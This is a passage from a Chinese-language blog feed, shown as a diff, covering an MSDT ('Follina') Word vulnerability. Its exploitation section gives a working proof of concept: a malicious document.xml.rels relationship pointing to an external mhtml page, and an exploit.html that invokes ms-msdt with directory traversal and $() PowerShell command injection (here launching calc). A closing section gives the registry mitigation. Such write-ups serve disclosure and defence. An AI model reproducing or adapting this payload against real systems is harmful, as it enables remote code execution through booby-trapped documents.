+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
+location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?
+IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";
+&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p>
+<p>包含$()中的代码会通过PowerShell执行</p>
+<p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p>
+<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p>
+<p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p>
+<p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p>
+<p><strong>禁用方法：</strong></p>
+<p>1.以管理员身份运行命令提示符</p>
+<p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p>
+<p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p>
+<p><strong>撤销禁用：</strong></p>
+<p>1.以管理员身份运行命令提示符</p>
+<p>2.恢复注册表项，执行命令“reg import [filename]”</p>
 ]]></content>
       <categories>
         <category>CVE</category>
